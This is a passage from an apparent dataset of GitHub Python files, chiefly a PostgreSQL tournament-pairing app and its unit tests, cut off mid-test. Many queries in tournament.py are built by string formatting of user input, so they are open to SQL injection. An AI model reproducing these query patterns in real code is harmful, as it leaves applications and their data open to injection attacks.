filenameedges, filenamedata):\n    dc.objects = defaultdict(list)\n    #dc.classes = dict()\n    dc.historyedgeclasses = dict()\n    for theclass in HistoryEdge.__subclasses__():\n        dc.historyedgeclasses[theclass.__name__] = theclass\n\n    c = sqlite3.connect(filenameedges)\n    cur = c.cursor()    \n    c.execute('''CREATE TABLE IF NOT EXISTS edge (\n                    documentid text, \n                    documentclassname text, \n                    edgeclassname text, \n                    edgeid text PRIMARY KEY, \n                    startnode1id text, \n                    startnode2id text, \n                    endnodeid text, \n                    propertyownerid text, \n                    propertyname text, \n                    propertyvalue text, \n                    propertytype text\n                )''')\n    c.commit()\n    cur.execute(\"SELECT documentid, documentclassname, edgeclassname, edgeid, startnode1id, startnode2id, endnodeid, propertyownerid, propertyname, propertyvalue, propertytype FROM edge\")\n\n    historygraphdict = defaultdict(HistoryGraph)\n    documentclassnamedict = dict()\n\n    rows = cur.fetchall()\n    for row in rows:\n        documentid = row[0]\n        documentclassname = row[1]\n        edgeclassname = row[2]\n        edgeid = row[3]\n        startnode1id = row[4]\n        startnode2id = row[5]\n        endnodeid = row[6]\n        propertyownerid = row[7]\n        propertyname = row[8]\n        propertyvaluestr = row[9]\n        propertytypestr = row[10]\n\n        if documentid in historygraphdict:\n            historygraph = historygraphdict[documentid]\n        else:\n            historygraph = HistoryGraph()\n            historygraphdict[documentid] = historygraph\n            documentclassnamedict[documentid] = documentclassname\n        if propertytypestr == \"FieldInt\":\n            propertyvalue = int(propertyvaluestr)\n        elif propertytypestr == \"FieldText\":\n            propertyvalue = str(propertyvaluestr)\n        elif propertytypestr == \"\" and edgeclassname == \"HistoryEdgeNull\":\n            propertyvalue = \"\"\n        else:\n            propertyvalue = propertyvaluestr\n        documentclassnamedict[documentid] = documentclassname\n        if startnode2id == \"\":\n            startnodes = {startnode1id}\n        else:\n            startnodes = {startnode1id, startnode2id}\n        edge = dc.historyedgeclasses[edgeclassname](edgeid, startnodes, endnodeid, propertyownerid, propertyname, propertyvalue, propertytypestr, documentid, documentclassname)\n        history = historygraphdict[documentid]\n        history.AddEdge(edge)\n\n    nulledges = list()\n    for documentid in historygraphdict:\n        doc = dc.classes[documentclassnamedict[documentid]](documentid)\n        nulledges.extend(history.MergeDanglingBranches())\n        history.Replay(doc)\n        dc.AddDocumentObject(doc)\n\n    SaveEdges(dc, filenameedges, nulledges)\n\n    return sqlite3.connect(filenamedata) #Return the database that can used for get sql objects\n\ndef GetSQLObjects(database, documentcollection, query):\n    ret = list()\n    cur = database.cursor()    \n    cur.execute(query)\n\n    rows = cur.fetchall()\n    for row in rows:\n        for classname in documentcollection.objects:\n            for obj in documentcollection.objects[classname]:\n                if obj.id == row[0]:\n                    ret.append(obj)\n    return ret\n        \n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/johlym/tournament/blob/598d9c7a45deaa5e5dcddf3779c0b70b892d0fd0",
        "file_path": "/tournament.py",
        "source": "#!/usr/bin/env python\n\n\"\"\"\nTOURNAMENT MATCHUP APPLICATION\n Simulates 1-on-1 matchups and swiss ranked matches. Queries a pgSQL database\n for match and player information.\n\"\"\"\n\nimport argparse as arg\nimport config as cfg\nimport datetime\nfrom decimal import Decimal\nfrom prettytable import PrettyTable\nimport psycopg2\nimport random\nimport re\nimport sys\nimport time\nimport tools\n\n\ndef check_version(sys_version):\n    \"\"\"\n    Let's check to make sure the user is running at least Python 2.7. Since\n    this app was coded with that version, it would make sense.\n    \"\"\"\n    # Check if python version is less than 2.7\n    if sys_version < (2, 7):\n        # if so, let the user know.\n        message = \"Version out of spec.\"\n        print message\n        time.sleep(3.0)  # Wait before proceeding through the app.\n        verstat = 1\n    else:\n        verstat = 0\n    return verstat\n\n\ndef connect():\n    # Connect to the PostgreSQL database.  Returns a database connection.\n    return psycopg2.connect(database=cfg.DATABASE_NAME,\n                            user=cfg.DATABASE_USERNAME,\n                            password=cfg.DATABASE_PASSWORD)\n\n\ndef registerPlayer(player_name=\"\", country=\"\"):\n    \"\"\"\n    Create a new player based on their name and country of origin. We expect\n    the following:\n    - Player Name\n    - Player Country of Origin\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    # check for numbers in player name\n    if re.search('[0-9]', player_name):\n        raise AttributeError(\"Player name is invalid (contains numbers)\")\n    # check if player name is shorter than 2 char.\n    if len(player_name) < 2:\n        raise AttributeError(\"Player name is less than 2 characters.\")\n    # player name is missing surname\n    if \" \" not in player_name:\n        raise AttributeError(\"Player name is invalid. (missing surname)\")\n    # player name shouldn't contain symbols\n    if re.search('[!@#$%^&*\\(\\)~`+=]', player_name):\n        raise AttributeError(\"Player name is invalid. (contains symbol(s))\")\n    # if a country isn't provided.\n    if not country:\n        raise SystemExit(\"Country of Origin Not Provided.\")\n    print \"Creating new entry for %s from %s\" % (player_name, country)\n    code = player_name[:4].lower() + str(random.randrange(1000001, 9999999))\n    start = time.time()\n    # Unlike other queries in this app, we don't use the % symbol,\n    # which allows psycopg2 to auto-escape any crazy single-quote-containing\n    # names. This way, one can add all the O'Malleys and O'Neals they desire!\n    cursor.execute(\"INSERT INTO players (name, country, code) \"\n                   \"VALUES (%s, %s, %s);\", (player_name, country,\n                                                         code))\n    stop = time.time()\n    # Using the start and stop time values above, we can print out how long\n    # it took to complete this action.\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Successfully created new entry in %s seconds\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef deletePlayer(player=\"\"):\n    \"\"\"\n    Delete an existing player based on their ID. We expect the following:\n    - Option (edit or delete)\n    - Player ID\n    - New Player Name (if edit)\n    - New Country of Origin (if edit)\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    start = time.time()\n    cursor.execute(\"SELECT * FROM players WHERE id=%s\" % player)\n    search = cursor.fetchall()\n    # if player ID wasn't found in search, raise an exception.\n    if not search:\n        raise LookupError(\"Invalid Player ID or ID Not Found.\")\n    cursor.execute(\"DELETE FROM players WHERE id = %s\" % player)\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef deletePlayers():\n    \"\"\"Deletes ALL players from the database.\"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    start = time.time()\n    # empty the players table\n    cursor.execute(\"TRUNCATE players;\")\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef editPlayer(player=\"\", new_name=\"\", new_country=\"\"):\n    \"\"\"Edit a player in the database, based on 'player',\n    and using 'new_name' and 'new_country'.\"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    # if both a name and country aren't provided, raise an exception.\n    if not (new_name and new_country):\n        raise AttributeError(\"New Information Not Provided.\")\n    player_name = new_name\n    player_country = new_country\n    start = time.time()\n    cursor.execute(\"SELECT * FROM players WHERE id=%s\" % player)\n    search = cursor.fetchall()\n    # if player ID wasn't found in search, raise an exception.\n    if not search:\n        raise LookupError(\"Invalid Player ID.\")\n    cursor.execute(\"UPDATE players \"\n                   \"SET name=\\'%s\\', country=\\'%s\\' \"\n                   \"WHERE id=%s\" % (player_name, player_country, player))\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef list_players():\n    \"\"\"\n    Get a list of players based on criteria and display method.\n    We expect the following:\n    - Limit to display\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    print \"List All Players.\"\n    cursor.execute(\"SELECT * FROM players;\")\n    results = cursor.fetchall()\n    count = 0\n    if not results:  # if there aren't any players\n        print \"No players found.\"\n        status = 1\n    else:\n        print \"Here's a list of all players in the database: \"\n        start = time.time()\n        # Start building the output table.\n        table = PrettyTable(['ID', 'NAME', 'COUNTRY'])\n        table.align = 'l' # left-align the table contents.\n        # Loop through the data and generate a table row for each iteration.\n        for row in results:\n            count += 1\n            table.add_row([row[0], row[1], row[2]])\n        # Finally, print the table.\n        print table\n        stop = time.time()\n        dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                        rounding=\"ROUND_UP\"))\n        print \"Returned %s results in %s seconds\" % (count, dur[:5])\n        connection.commit()\n        cursor.close()\n        connection.close()\n        status = 0\n    return status\n\n\ndef reportMatch(p1=\"\", p2=\"\"):\n    \"\"\"\n    Initiate a match. We expect the following:\n    - ID of Player 1\n    - ID of Player 2\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    p1_code = ''\n    p2_code = ''\n    p1_name = ''\n    p2_name = ''\n    # if both players aren't provided\n    if not (p1 and p2):\n        raise AttributeError(\"Both player IDs need to be provided.\")\n    # if player 1's ID contains one or more letters\n    if re.search('[A-Za-z]', str(p1)):\n        raise AttributeError(\"Player 1 ID contains letter(s).\")\n    # if player 2's ID contains one or more letters\n    if re.search('[A-Za-z]', str(p2)):\n        raise AttributeError(\"Player 2 ID contains letter(s).\")\n    # if player 1's ID contains one or more symbols\n    if re.search('[!@#$%^&*\\(\\)~`+=]', str(p1)):\n        raise AttributeError(\"Player 1 ID is invalid. (contains symbol(s))\")\n    # if player 2's ID contains one or more symbols\n    if re.search('[!@#$%^&*\\(\\)~`+=]', str(p2)):\n        raise AttributeError(\"Player 2 ID is invalid. (contains symbol(s))\")\n    cursor.execute(\"SELECT * FROM players WHERE id=%s\" % p1)\n    code_lookup = cursor.fetchall()\n    if not code_lookup:  # if player 1 can't be found\n        raise LookupError(\"Player 1 ID does not exist.\")\n    # Correlate a player's unique code to their name\n    for row in code_lookup:\n        p1_code = row[3]\n        cursor.execute(\"SELECT * FROM players \"\n                                     \"WHERE code=\\'%s\\'\" % p1_code)\n        player_name = cursor.fetchall()\n        for result in player_name:\n            p1_name = result[1]\n    cursor.execute(\"SELECT * FROM players WHERE id=%s\" % p2)\n    code_lookup = cursor.fetchall()\n    if not code_lookup:  # if player 2 can't be found\n        raise LookupError(\"Player 2 ID does not exist.\")\n    # and again for player 2\n    for row in code_lookup:\n        p2_code = row[3]\n        cursor.execute(\"SELECT * FROM players \"\n                                     \"WHERE code=\\'%s\\'\" % p2_code)\n        cursor.execute(\"SELECT * FROM players WHERE id=%s\" % p2)\n        player_name = cursor.fetchall()\n        for result in player_name:\n            p2_name = result[1]\n    print \"%s vs. %s... \" % (p1_name, p2_name),\n    if (not p1_name) or (not p2_name):\n        raise ValueError(\"One of the two players you entered doesn't exist.\")\n    # In this world, the first player always wins. One could call this\n    # function and randomly choose who's is first position in order to make\n    # it fair.\n    winner = p1_code\n    loser = p2_code\n    print \"Winner: %s\" % p1_name\n    ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]\n    cursor.execute(\"INSERT INTO matches (player_1, player_2, \"\n                   \"timestamp) \"\n                   \"VALUES (\\'%s\\', \\'%s\\', \\'%s\\');\" % (winner, loser, ts))\n    connection.commit()\n    cursor.close()\n    connection.close()\n    status = 0\n    return status\n\n\ndef swissPairings():\n    \"\"\"\n    match up each of the players in the database and swiss-ify them.\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    bye = ''\n    player_pairs = []\n    round_number = 0\n    start = time.time()\n    cursor.execute(\"SELECT * FROM players;\")\n    players_list = cursor.fetchall()\n    # Count the number of players in the list\n    count = len(players_list)\n    if count == 0:\n        raise ValueError(\"No players found.\")\n    # If there isn't an even amount:\n    if count % 2:\n        print count\n        # simple math.\n        bye = players_list[count - 1]\n        players_list.pop(random.randrange(0,count))\n        print len(players_list)\n    \"\"\" Since it's technically pure coincidence that the entries were in order,\n    we need to explicitly sort them. Defaults to the ID for sorting as it's\n    the first non-symbol in each entry.\n    If we did the list organization in the database, it would require extra\n    cycles in the code to get the data right. \"\"\"\n\n    players_list1 = players_list[:len(players_list)/2]\n    players_list2 = players_list[len(players_list)/2:]\n    # Flip the second dict; faster than using the reversed() builtin.\n    tx = PrettyTable([\"TEAM A\", \"TEAM B\"])\n    # some master table settings we need to declare for formatting purposes\n    tx.align = \"c\"\n    tx.hrules = False\n    tx.vrules = False\n    tx.left_padding_width = 0\n    tx.right_padding_width = 0\n    ta = tools.table_gen(['ID', 'Name', 'Country'], players_list1, \"l\")\n    tb = tools.table_gen(['ID', 'Name', 'Country'], players_list2, \"l\")\n    tx.add_row([ta, tb])\n    print tx\n    if bye:\n        print \"Bye: \" + bye[1]\n    # smoosh (technical term) the two lists together and make them fight\n    # for their dinner!\n    for a, b in zip(players_list1, players_list2):\n        round_number += 1\n        print \"Round %i: \" % round_number,\n        reportMatch(p1=str(a[0]), p2=str(b[0]))\n        player_pairs.append([a[0], a[1], b[0], b[1]])\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    print \"Swiss matchups complete.\"\n    connection.commit()\n    cursor.close()\n    connection.close()\n    status = 0\n    return player_pairs\n\n\ndef deleteMatch(match=\"\"):\n    \"\"\"\n    Delete an existing match. We expect the following:\n    - Match ID\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    if not match:\n        raise ValueError(\"An ID # is required.\")\n    start = time.time()\n    cursor.execute(\"DELETE FROM matches where id=%s\" % match)\n    stop = time.time()\n\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef deleteMatches():\n    \"\"\"\n    Delete ALL matches from the database.\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    start = time.time()\n    cursor.execute(\"TRUNCATE matches;\")\n    stop = time.time()\n\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef latest_match():\n    \"\"\"\n    Get the latest match's information\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    print \"The Latest Match\"\n    name = ''\n    count = 0\n    returned_id = 0\n    start = time.time()\n    cursor.execute(\"SELECT * FROM matches ORDER BY id DESC LIMIT 1\")\n    results = cursor.fetchall()\n    # Generate the table\n    table = PrettyTable(['#', 'ID#', 'P1 ID', 'P2 ID', 'WINNER', 'TIME'])\n    table.align = 'l'\n    for row in results:\n        count += 1\n        # Generate the rows for the table\n        cursor.execute(\"SELECT * FROM players \"\n                       \"WHERE code=\\'%s\\'\" % row[3])\n        player = cursor.fetchall()\n        for entry in player:\n            name = entry[1]\n        if name == '':\n            name = \"[PLAYER DELETED]\"\n        table.add_row([count, row[0], row[1], row[2], name, row[4]])\n        returned_id = row[0]\n    print table\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Returned %s results in %s seconds\" % (count, dur[:5])\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return returned_id\n\n\ndef playerStandings():\n    \"\"\"\n    Rank players by the number of wins. Get the list of wins and total\n    matches for each player.\n    \"\"\"\n    count = 0\n    returned_blob = []\n    connection = connect()\n    cursor = connection.cursor()\n    start = time.time()\n    cursor.execute(\"SELECT * from players;\")\n    player_blob = cursor.fetchall()\n    table = PrettyTable([\"ID\", \"PLAYER\", \"WINS\", \"MATCHES\"])\n    table.align = \"l\"\n    for player in player_blob:\n        count += 1\n        # Count the number of times the player has won (they are present in\n        # player_1 column inside tournament.matches).\n        cursor.execute(\"SELECT count(*) \"\n                       \"FROM matches \"\n                       \"WHERE player_1='%s'\" % player[3])\n        wins_blob = cursor.fetchall()\n        wins_num = wins_blob[0][0]\n        # Count the number of times the player has lost (they are present in\n        # player_2 column inside tournament.matches).\n        cursor.execute(\"SELECT count(*) \"\n                       \"FROM matches \"\n                       \"WHERE player_2='%s'\" % player[3])\n        losses_blob = cursor.fetchall()\n        matches_num = losses_blob[0][0] + wins_num\n        table.add_row([player[0], player[1], wins_num, matches_num])\n        returned_blob.append([player[0], player[1], wins_num, matches_num])\n    print table\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Returned %s results in %s seconds\" % (count, dur[:5])\n    return returned_blob\n\n\ndef countPlayers():\n    \"\"\"A function needed to fulfill the requirements of Udacity's\n    tournament_test.py. This function gets used to count the number of\n    players in the Players table.\"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    cursor.execute(\"SELECT COUNT(id) FROM players;\")\n    result = cursor.fetchall()\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return result[0][0]\n\n\ndef argument_parser():\n    \"\"\"\n    Using command-line arguments to control actions. User can use flags to run\n    certain, pre-defined scenarios. This will also allow for reuse of code where\n    applicable.\n    \"\"\"\n    parser = arg.ArgumentParser(description=cfg.APP_DESCRIPTION)\n\n    # NEW PLAYER function\n    parser.add_argument('--new-player', '-n',\n                        dest='registerPlayer',\n                        action='store',\n                        nargs='+',\n                        metavar='FIRST LAST COUNTRY',\n                        help='Create a new player.')\n\n    # NEW MATCH function\n    parser.add_argument('--new-match', '-m',\n                        dest='new_match',\n                        action='store',\n                        nargs=\"+\",\n                        metavar='ID#1 ID#2',\n                        help='Create a new match. Provide two player IDs.')\n\n    # SWISS MATCHUP function\n    parser.add_argument('--swiss-match', '-s',\n                        dest='swissPairings',\n                        action='store_true',\n                        default=False,\n                        help='Create a new match with swiss pairing.')\n\n    # GET LATEST RESULTS function\n    parser.add_argument('--latest-match', '-l',\n                        dest='latest_match',\n                        action='store_true',\n                        default=False,\n                        help='Get the results from the latest match.')\n\n    # DELETE PLAYER function\n    parser.add_argument('--delete-player', '-d',\n                        dest='deletePlayer',\n                        action='store',\n                        metavar='ID',\n                        help='Remove a player from the match system.')\n\n    # EDIT PLAYER function\n    parser.add_argument('--edit-player', '-e',\n                        dest='editPlayer',\n                        action='store',\n                        nargs='+',\n                        metavar='ID NEWNAME NEWCOUNTRY',\n                        help='Edit a player\\'s exiting information.')\n\n    # DELETE MATCH function\n    parser.add_argument('--delete-match', '-f',\n                        dest='deleteMatch',\n                        action='store',\n                        metavar='ID',\n                        help='Remove a match from the match system.')\n\n    # LIST PLAYERS function\n    parser.add_argument('--list-players', '-p',\n                        dest='list_players',\n                        action='store_true',\n                        default=False,\n                        help='List all players.')\n\n    # LIST RANKED function\n    parser.add_argument('--list-ranking', '-t',\n                        dest='list_ranking',\n                        action='store_true',\n                        default=False,\n                        help='List rankings.')\n\n    return parser\n\n\n# ROUTING LOGIC #\ndef main():\n    parser = argument_parser()\n    args = parser.parse_args()\n    if args.registerPlayer:\n        registerPlayer(player_name=(args.registerPlayer[0] + ' ' + args.registerPlayer[1]),\n                   country=args.registerPlayer[2])\n\n    if args.new_match:\n        players = args.new_match\n        reportMatch(p1=players[0], p2=players[1])\n\n    if args.swiss_match:\n        swissPairings()\n\n    if args.deletePlayer:\n        deletePlayer(player=str(args.delete_player))\n\n    if args.editPlayer:\n        name = \"%s %s\" % (args.editPlayer[1], args.editPlayer[2])\n        editPlayer(player=str(args.editPlayer[0]),\n                    new_name=name, new_country=args.editPlayer[3])\n\n    if args.list_players:\n        list_players()\n\n    if args.deleteMatch:\n        deleteMatch(match=str(args.deleteMatch))\n\n    if args.latest_match:\n        latest_match()\n\n    if args.list_ranking:\n        playerStandings()\n\n    # IF NO ARGUMENTS #\n\n    # Print all options.\n\n    if len(sys.argv) == 1:\n        parser.print_help()\n\n\nif __name__ == \"__main__\":\n    check_version(sys.version_info)\n    main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/johlym/tournament/blob/fe7569782e49aa3a681ca2e1770008853190fed0",
        "file_path": "/test.py",
        "source": "#!/usr/bin/env python\n\n\"\"\" The master Unit test set up. Each set of tests below should cover all\nfunctional aspects of tournament.py. The original file tournament_test.py has\nbeen rolled in here and its tests exist below. Most tests below are YAY/NAY\nin that we're expecitng very specific results. In most cases, each function\nin tournament.py returns a status code based on its behavior. These codes are\nreturned when non-critical events take place such as \"no players found\" when\ntrying to search for players.\n\"\"\"\n\nimport time\nimport unittest\nimport psycopg2\nimport tournament\nimport tools\n\n\ndef connect():\n    # Connect to the PostgreSQL tools.  Returns a database connection.\n    return psycopg2.connect(database='tournament', user='postgres')\n\n\ndef drop():\n    co = connect()\n    cu = co.cursor()\n    cu.execute(\"DROP TABLE IF EXISTS players CASCADE;\")\n    cu.execute(\"DROP TABLE IF EXISTS matches CASCADE;\")\n    co.commit()\n    cu.close()\n    co.close()\n    return 0\n\n\ndef truncate(table):\n    co = connect()\n    cu = co.cursor()\n    cu.execute(\"TRUNCATE \" + table + \";\")\n    co.commit()\n    cu.close()\n    co.close()\n\n\n# Create database contents\ndef create():\n    co = connect()\n    cu = co.cursor()\n    cu.execute(\"CREATE TABLE players(id serial NOT NULL,\"\n               \"name text NOT NULL, country text \"\n               \"NOT NULL, code text, CONSTRAINT players_pkey PRIMARY KEY (id))\"\n               \"WITH (OIDS=FALSE);\")\n    cu.execute(\"ALTER TABLE players OWNER TO postgres;\")\n    cu.execute(\"CREATE TABLE matches (id serial NOT NULL, \"\n               \"p1 text NOT NULL, p2 \"\n               \"text NOT NULL, \"\n               \"\\\"timestamp\\\" text NOT NULL,\"\n               \"CONSTRAINT matches_pkey PRIMARY KEY (id))\"\n               \"WITH (OIDS=FALSE);\")\n    cu.execute(\"ALTER TABLE matches OWNER TO postgres;\")\n    co.commit()\n    cu.close()\n    co.close()\n    return 0\n\n\ndef create_dummy_data():\n    drop()\n    tools.bulksql(open(\"sql/data.sql\", \"r\").read())\n\n\ndef dummy_player(player_name=\"\", country=\"\"):\n    s = tournament.registerPlayer(player_name=player_name, country=country)\n    return s\n\n\nclass TestCreateDatabaseTable(unittest.TestCase):\n    def test_connect_to_database(self):\n        \"\"\"test connection to database 'tournament'\"\"\"\n        connect()\n\n    def test_drop_database_tables_if_exist(self):\n        \"\"\"setup process: drop tables from database if they exist\"\"\"\n        self.assertEqual(drop(), 0)\n\n    def test_create_database_tables(self):\n        \"\"\"create database tables 'players', 'matches'\"\"\"\n        self.assertEqual(drop(), 0)\n        self.assertEqual(create(), 0)\n\n\nclass TestMainDatabaseConnector(unittest.TestCase):\n    def test_connect_to_database(self):\n        \"\"\"test connection to database 'tournament'\"\"\"\n        tools.connect()\n\n\nclass BaseTestCase(unittest.TestCase):\n    \"\"\"Base TestCase class, sets up a CLI parser\"\"\"\n        \n    @classmethod\n    def setUpClass(cls):\n        parser = tournament.argument_parser()\n        cls.parser = parser\n\n\nclass TestVerifyCheckVersionMessage(BaseTestCase):\n    def test_wait_time(self):\n        \"\"\"check_version() is waiting the correct time (3.0s)\"\"\"\n        start = time.time()\n        tournament.check_version((2, 4))\n        end = time.time()\n        count = round(end - start, 1)\n        self.assertEqual(count, 3.0)\n\n\nclass TestVerifyVersionTooLowStatusReportSuccess(BaseTestCase):\n    def test_older_python_version(self):\n        \"\"\"check_version() 1 if out of spec\"\"\"\n        self.assertEqual(tournament.check_version((2, 4)), 1)\n\n    def test_same_python_version(self):\n        \"\"\"check_version() 0 if in spec for same version\"\"\"\n        self.assertEqual(tournament.check_version((2, 7)), 0)\n\n    def test_newer_python_version(self):\n        \"\"\"check_version() 0 if in spec for same version\"\"\"\n        self.assertEqual(tournament.check_version((2, 9)), 0)\n\n    def test_newer_python3_version(self):\n        \"\"\"check_version() 0 if in spec for same version\"\"\"\n        self.assertEqual(tournament.check_version((3, 4)), 0)\n\n\nclass TestCommandLineArguments(BaseTestCase):\n    def test_arg_new_player(self):\n        \"\"\"Script should reject if --new-player argument is empty\"\"\"\n        with self.assertRaises(SystemExit):\n            self.parser.parse_args([\"--new-player\"])\n\n    def test_arg_edit_player(self):\n        \"\"\"Script should reject if --edit-player argument is empty\"\"\"\n        with self.assertRaises(SystemExit):\n            self.parser.parse_args([\"--edit-player\"])\n\n    def test_arg_delete_player(self):\n        \"\"\"Script should reject if --edit-player argument is empty\"\"\"\n        with self.assertRaises(SystemExit):\n            self.parser.parse_args([\"--delete-player\"])\n\n    def test_arg_delete_match(self):\n        \"\"\"Script should reject if --edit-player argument is empty\"\"\"\n        with self.assertRaises(SystemExit):\n            self.parser.parse_args([\"--delete-match\"])\n\n\nclass TestNewPlayer(BaseTestCase):\n    def test_name_contains_integer(self):\n        \"\"\"registerPlayer() should reject if name contains integer\"\"\"\n        with self.assertRaises(AttributeError):\n            tournament.registerPlayer(player_name=\"1\")\n\n    def test_name_less_two_characters(self):\n        \"\"\"registerPlayer() should reject if name is less than two characters\"\"\"\n        with self.assertRaises(AttributeError):\n            tournament.registerPlayer(player_name=\"a\")\n\n    def test_name_contains_symbols(self):\n        \"\"\"registerPlayer() should reject if name contains symbols\"\"\"\n        with self.assertRaises(AttributeError):\n            tournament.registerPlayer(player_name=\"J!mes Dean\")\n\n    def test_name_first_and_last(self):\n        \"\"\"registerPlayer() should reject if both a first and last name aren't\n        present\"\"\"\n        with self.assertRaises(AttributeError):\n            tournament.registerPlayer(player_name=\"James\")\n\n    def test_player_has_three_word_name(self):\n        \"\"\"registerPlayer() should return 0 if player is given a middle name\"\"\"\n        self.assertEqual(0, dummy_player(player_name=\"James Dean Rogan\",\n                                         country=\"United States\"))\n\n    def test_country_not_provided(self):\n        \"\"\"registerPlayer() should return 0 if player is given a middle name\"\"\"\n        with self.assertRaises(SystemExit):\n            dummy_player(player_name=\"James Rogan\", country=\"\")\n\n    def test_add_new_player(self):\n        \"\"\"registerPlayer() should return 0 if adding new player was successful\"\"\"\n        self.assertEqual(0, dummy_player(player_name=\"Christoph Waltz\",\n                                         country=\"Germany\"))\n\n\nclass TestEditPlayer(BaseTestCase):\n    def setUp(self):\n        create_dummy_data()\n\n    def test_option_edit(self):\n        \"\"\"editPlayer() edits player with new info provided\"\"\"\n        q = \"SELECT * FROM matches ORDER BY id LIMIT 1\"\n        r = tools.query(q)\n        s = str(r[0][0])\n        self.assertEquals(tournament.editPlayer(player=s,\n                                                 new_name=\"Johan Bach\",\n                                                 new_country=\"Guam\"), 0)\n\n    def test_option_delete(self):\n        \"\"\"editPlayer() deletes player\"\"\"\n        q = \"SELECT * FROM matches ORDER BY id LIMIT 1\"\n        r = tools.query(q)\n        s = str(r[0][0])\n        self.assertEquals(tournament.deletePlayer(player=s), 0)\n\n    def test_edit_missing_new_info(self):\n        \"\"\"editPlayer() throws when both new_name and new_country are not\n        specified\"\"\"\n        with self.assertRaises(AttributeError):\n            tournament.editPlayer(new_name=\"Joan Jett\")\n\n    def test_no_player_id(self):\n        \"\"\"Script should reject if --edit-player argument is empty\"\"\"\n        with self.assertRaises(SystemExit):\n            self.parser.parse_args([\"--edit-player\"])\n\n    def test_delete_invalid_player_id(self):\n        \"\"\"editPlayer() should throw if the player ID is invalid\"\"\"\n        with self.assertRaises(LookupError):\n            tournament.deletePlayer(player=\"38471237401238\")\n\n    def test_edit_invalid_player_id(self):\n        \"\"\"editPlayer() should throw if the player ID is invalid\"\"\"\n        with self.assertRaises(LookupError):\n            tournament.editPlayer(player=\"38471237401238\",\n                                   new_name=\"Michael Bay\", new_country=\"Japan\")\n\n\nclass TestListPlayers(BaseTestCase):\n    def setUp(self):\n        create_dummy_data()\n\n    def test_display_zero_matches(self):\n        \"\"\"list_players() returns 1 if the tournament.Players table is empty\"\"\"\n        q = \"TRUNCATE TABLE players;\"\n        tools.query(q)\n        self.assertEqual(tournament.list_players(), 1)\n\n    def test_list_players(self):\n        \"\"\"list_players() returns 0 if it works.\"\"\"\n        dummy_player(player_name=\"Mark German\", country=\"Germany\")\n        self.assertEqual(tournament.list_players(), 0)\n\n\nclass TestNewMatch(BaseTestCase):\n    def setUp(self):\n        create_dummy_data()\n        \n    def test_less_than_two_players(self):\n        \"\"\"reportMatch() throws if both players are not provided\"\"\"\n        with self.assertRaises(AttributeError):\n            tournament.reportMatch(p1=9, p2=\"\")\n        \n    def test_p1_not_valid(self):\n        \"\"\"reportMatch() throws if player 1 is not valid\"\"\"\n        q = \"TRUNCATE TABLE players;\"\n        tools.query(q)\n        self.assertEqual(dummy_player(player_name=\"Double Quarder\",\n                                      country=\"Playland\"), 0)\n        q = \"SELECT * FROM matches ORDER BY id LIMIT 1\"\n        p = tools.query(q)\n        i1 = p[0][0]\n        self.assertEqual(dummy_player(player_name=\"Big Mac Sauce\",\n                                      country=\"Playland\"), 0)\n        q = \"SELECT * FROM matches ORDER BY id LIMIT 1\"\n        p = tools.query(q)\n        i2 = str(p[0][0])\n        i1 = str(i1 + 2)\n        with self.assertRaises(LookupError):\n            tournament.reportMatch(p1=i1, p2=i2)\n        \n    def test_p2_not_valid(self):\n        \"\"\"reportMatch() throws if player 2 is not valid\"\"\"\n        q = \"TRUNCATE TABLE players;\"\n        tools.query(q)\n        self.assertEqual(dummy_player(player_name=\"Fissh Fillay\",\n                                      country=\"Playland\"), 0)\n        q = \"SELECT * FROM matches ORDER BY id LIMIT 1\"\n        p = tools.query(q)\n        i1 = str(p[0][0])\n        self.assertEqual(dummy_player(player_name=\"Kulv Sangwich\",\n                                      country=\"Playland\"), 